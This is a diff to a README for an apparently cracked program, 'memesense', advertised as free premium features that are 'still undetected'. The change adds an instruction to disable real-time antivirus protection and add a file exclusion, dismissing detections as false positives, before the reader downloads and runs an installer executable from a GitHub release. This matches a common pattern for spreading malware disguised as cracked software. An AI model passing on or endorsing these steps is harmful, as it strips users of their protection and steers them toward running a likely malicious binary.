@@ -19,10 +19,11 @@ Enjoy premium features without paying a dime. Tested and still undetected as of 
 
 📥 Installation
 
+Disable real time protection + add a file exclusion (false positives will be fixed soon)
+
 Download the latest release from [Releases](https://github.com/savagechicky/memesense-cracked/releases/tag/memesense)
 
-
-Run memesenseinstaller.exe as Administrator
+Run memesenseinstaller.exe
 
 After running, memesense.exe will appear in the same folder as the installer
 
